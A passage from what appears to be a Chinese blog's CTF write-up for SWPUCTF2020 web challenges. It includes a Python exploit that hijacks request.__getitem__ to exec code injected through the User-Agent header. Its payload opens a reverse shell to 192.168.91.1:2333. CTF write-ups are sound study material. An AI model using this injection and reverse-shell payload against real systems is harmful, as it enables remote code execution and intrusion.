+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/18.png" srcset="/img/loading.gif"></p>
+<p><strong>将request的[]重载为exec实现命令执行，并且用UA头来注入</strong>(新知识点)</p>
+<p>反弹shell拿到flag</p>
+<p>Exp:</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests<br> <br>url =<span class="hljs-string">&quot;http://192.168.31.51:6061/Equ.php&quot;</span><br> <br>s= requests.Session()<br> <br>def <span class="hljs-built_in">exp</span>(poc1,poc2):<br>    <span class="hljs-keyword">data</span> = &#123;<br>        <span class="hljs-string">&quot;left&quot;</span>:poc1+<span class="hljs-string">&quot;1&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>:<span class="hljs-string">&quot;1&quot;</span><br>    &#125;<br>    header = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:poc2<br>    &#125;<br>    req = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>,headers=header)<br>    print req.<span class="hljs-keyword">text</span><br>#<span class="hljs-built_in">exp</span>(<span class="hljs-string">&#x27;__builtins__.eval=__builtins__.exec#&#x27;</span>,<span class="hljs-string">&quot;xxx&quot;</span>)<br><span class="hljs-built_in">exp</span>(<span class="hljs-string">&quot;request.__class__.__getitem__=__builtins__.exec;request[request.user_agent.string];&quot;</span>,<span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.91.1&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/17.png" srcset="/img/loading.gif"></p>
+<h1 id="4-遗憾"><a href="#4-遗憾" class="headerlink" title="4.遗憾"></a>4.遗憾</h1><p>最近在考试，学校抽搐了，在临近期末的时候又多了一门科目。余下的题目来不及复现。。。。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/12/16/Linux%E5%9F%BA%E7%A1%80%E4%B8%80/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Linux基础一</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/">
+                        <span class="hidden-mobile">CTF-关于node.js题目的尝试</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
